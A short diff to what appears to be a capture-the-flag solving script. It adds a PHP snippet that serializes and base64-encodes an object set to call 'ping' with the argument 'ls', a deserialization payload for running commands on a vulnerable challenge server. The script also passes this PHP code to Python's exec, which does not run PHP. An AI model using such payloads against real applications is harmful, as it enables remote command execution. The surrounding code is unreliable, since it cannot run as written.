@@ -13,4 +13,19 @@ def xctf():
             print("cipher",cipher)
             print('plain',plain)
             break   
-print(ord('f'))
+php_code='''
+class ease{
+private $method;
+private $args;
+function __construct($method, $args) {
+    $this->method = $method;
+    $this->args = $args;
+} 
+}
+$a = new ease("ping",array('ls'));
+$b = serialize($a);
+echo $b;
+echo'</br>';
+echo base64_encode($b);
+'''
+exec(php_code)
